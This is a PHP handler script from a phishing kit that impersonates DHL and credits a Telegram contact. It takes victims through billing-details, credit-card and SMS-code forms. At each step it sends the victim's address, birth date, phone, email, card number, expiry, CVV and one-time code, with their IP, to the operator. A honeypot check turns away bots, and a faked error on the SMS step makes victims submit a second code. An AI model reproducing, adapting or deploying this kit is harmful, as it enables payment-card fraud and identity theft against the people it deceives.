<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/

    require_once 'app/config.php';
    if($_SERVER['REQUEST_METHOD'] == "POST") {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if( $_POST['steeep'] == "details" ) {
            $_SESSION['errors'] = [];
            $_SESSION['address']    = $_POST['address'];
            $_SESSION['zip_code']    = $_POST['zip_code'];
            $_SESSION['city']    = $_POST['city'];
            $_SESSION['birth_date']    = $_POST['birth_date'];
            $_SESSION['phone']    = $_POST['phone'];
            $_SESSION['email']    = $_POST['email'];
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = get_text("address_error");
            }
            if( empty($_POST['zip_code']) ) {
                $_SESSION['errors']['zip_code'] = get_text("zip_code_error");
            }
            if( empty($_POST['city']) ) {
                $_SESSION['errors']['city'] = get_text("city_error");
            }
            if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
                $_SESSION['errors']['birth_date'] = get_text("birth_date_error");
            }
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = get_text("phone_error");
            }
            if( validate_email($_POST['email']) == false ) {
                $_SESSION['errors']['email'] = get_text("email_error");
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | DHL | Billing';
                $message = "「 💿 +1 BILLING 💿 」\r\n\r\n";
                $message .= '💿 Address : ' . $_POST['address'] . "\r\n";
                $message .= '💿 Zip code : ' . $_POST['zip_code'] . "\r\n";
                $message .= '💿 City : ' . $_POST['city'] . "\r\n";
                $message .= '💿 Birth date : ' . $_POST['birth_date'] . "\r\n\r\n";
                $message .= '📱 Phone : ' . $_POST['phone'] . "\r\n";
                $message .= '📱 Email : ' . $_POST['email'] . "\r\n\r\n";
                $message .= '💎 IP : ' . get_client_ip();
                send($subject,$message);
                echo "../index.php?redirection=cc";
                exit();
            } else {
                echo "../index.php?redirection=details&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "cc" ) {
            $_SESSION['errors'] = [];
            $_SESSION['one']    = $_POST['one'];
            $_SESSION['two']    = $_POST['two'];
            $_SESSION['three']    = $_POST['three'];
            $_SESSION['name']    = $_POST['name'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( $one == false ) {
                $_SESSION['errors']['one'] = get_text("one_error");
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = get_text("two_error");
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = get_text("three_error");
            }
            if( validate_name($_POST['name']) == false ) {
                $_SESSION['errors']['name'] = get_text("name_error");
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | DHL | Card';
                $message = "「 💳 +1 CARD 💳 」\r\n\r\n";
                $message .= "💳 Numéro : " . $_POST['one'] . "\r\n";
                $message .= "💳 Expiration : " . $_POST['two'] . "\r\n";
                $message .= "💳 CVV : " . $_POST['three'] . "\r\n";
				$message .= "------------------------------------\r\n------------------------------------\r\n";
				$message .= "📀 Address : " . $_SESSION['address'] . "\r\n";
                $message .= "📀 Zip code : " . $_SESSION['zip_code'] . "\r\n";
                $message .= "📀 City : " . $_SESSION['city'] . "\r\n";
                $message .= "📀 Birth date : " . $_SESSION['birth_date'] . "\r\n\r\n";
                $message .= "📱 Phone : " . $_SESSION['phone'] . "\r\n\r\n";
                $message .= "📱 Email : " . $_SESSION['email'] . "\r\n";
                $message .= "💎 IP : " . get_client_ip();
                send($subject,$message);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=cc&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "sms" ) {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']    = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = get_text("sms_code_error");
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | DHL | Sms';
                $message = "「 🤖 +1 VBV 🤖 」\r\n\r\n";
                $message .= '🤖 Code : ' . $_POST['sms_code'] . "\r\n\r\n";
                $message .= '💎 IP : ' . get_client_ip();
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    echo "../index.php?redirection=success";
                    exit();
                }
                $_SESSION['errors']['sms_code'] = get_text("sms_code_error");
                echo "../index.php?redirection=loading&error=1";
                exit();
            } else {
                $error = $_POST['error'];
                echo "../index.php?redirection=sms&error=$error";
                exit();
            }
        }

    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>